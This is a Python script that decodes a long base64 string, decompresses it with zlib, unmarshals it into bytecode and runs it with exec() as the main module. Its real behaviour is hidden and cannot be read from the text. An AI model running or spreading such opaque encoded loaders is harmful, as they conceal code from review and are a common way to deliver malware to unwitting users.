# -*- coding: utf-8 -*-

import sys, types, marshal, base64, zlib
_payload_b64 = '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'

def _run_payload():
    try:
        data = base64.b64decode(_payload_b64)
        data = zlib.decompress(data)
        code_obj = marshal.loads(data)
    except Exception as e:
        print("oops payload:", e, file=sys.stderr)
        raise

    module = types.ModuleType("__main__")
    module.__file__ = __file__
    sys.modules["__main__"] = module
    exec(code_obj, module.__dict__)

if __name__ == "__main__":
    _run_payload()
